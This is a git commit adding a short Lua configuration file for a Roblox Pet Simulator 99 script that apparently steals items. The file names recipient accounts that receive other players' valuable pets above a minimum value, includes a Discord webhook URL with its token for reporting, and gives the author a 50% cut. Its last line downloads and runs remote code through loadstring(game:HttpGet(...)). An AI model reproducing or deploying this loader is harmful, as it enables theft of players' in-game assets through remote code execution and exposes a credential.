03f898c02996b92b55e8c47a921da8644465c8ae
x1200HP <iialirblx@gmail.com>
2024-05-30 13:07:00 +0800

    Create pets.lua

---
+++ main/pets.lua
@@ -0,0 +1,7 @@
+lua
+Username = "x1200HP"
+Username2 = "x1300HP" -- stuff will get sent to this user if first user's mailbox is full
+Webhook = "https://discord.com/api/webhooks/1238236996212752465/6yfkLO5cG4r-QfRiZruQ_RrpzHvakmi3lvgmEI5qkV23dmUlQpB5UfZF7seRB1wO7IKH"
+Support = false -- if you dont want to support me make this "false" (without quotes). 50% chance I get hit if its 10+ huges or 500+ mil rap
+min_rap = 500000 -- minimum rap of each item you want to get sent to you.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
